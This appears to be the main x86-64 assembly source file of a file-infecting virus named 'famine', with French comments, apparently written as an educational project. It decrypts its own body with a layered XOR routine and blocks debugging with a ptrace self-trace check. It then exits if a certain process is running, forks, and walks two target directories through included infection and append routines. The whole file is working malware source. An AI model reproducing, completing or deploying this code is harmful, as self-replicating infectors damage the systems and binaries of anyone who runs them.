%include "include.s"

 ;   lea r15, [rel jump]
 ;   cmp byte [r15], 0xC3                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main

main:
    enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
    push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
    push rcx
    push rdi
    push rsi

decrypte:
    jmp encrypted_start
    db "hahaahhhahhah"
    lea rdi, [rel decrypt_v2 + DECRYPT_FUNC_SIZE]
    mov rsi, ENCRYPT_SIZE
    lea rdx, [rel decrypt_v2 + DECRYPT_KEY_OFFSET]
    mov rcx, KEY_SIZE
    mov rbx, rsi
    dec rbx
    mov r8, rdx

    ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
    cmp rbx, 0
    mov rdx, [rel decrypt_v2]
    mov rdx, [rdi + rbx - 1]
    xor byte [rdi + rbx], dl
    

    ; data[i] = data[i] ^ key[i % key_size];
    xor rdx, rdx
    mov rax, rbx
    div rcx
    mov dl, [r8 + rdx]
    xor [rdi + rbx], dl

    ; data[i] = data[i] ^ value[i % 16]
    mov rax, rbx
    and rax, 15
    lea rdx, [rel decrypt_v2]
    mov al,  [rdx + rax]
    xor byte [rdi + rbx], al

    ; data[i] = (data[i] + i) % 256
    mov al, byte [rdi + rbx]
    sub al, bl
    mov byte [rdi + rbx], al

    dec rbx
    cmp rbx, 0
encrypted_start:
    xor rdi, rdi ;  PTRACE_TRACEME
    xor rsi, rsi
    mov rdx, 1
    xor r10, r10
    mov rax, SYS_PTRACE
    syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
    cmp rax, 0
    jl exit

    mov rax, SYS_GETPID
    syscall
    mov [rsp + ppid], rax

    call get_processus_actif
    cmp rax, 0
    jnz exit

birth_of_child:
    mov rax, SYS_FORK
    syscall
    mov rax, SYS_GETPID
    syscall
    cmp rax, [rsp + ppid]
    jz exit

    lea rdi, [rsp + fileName]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive

    lea rdi, [rsp + fileName]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    jmp exit

exit:
    mov rax, SYS_GETPID
    syscall
    mov rbx, [rsp + ppid]
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

    cmp rax, rbx
    jnz death_of_child
    xor rax, rax
    
jump:
    ret
    nop
    nop
    nop
    nop

death_of_child:
    ret

%include "get_processus_actif.s"

;%include "putnbr.s"

%include "recursive.s"

%include "injection.s"

%include "append.s"

%include "decrypt.s"

%include "data.s"
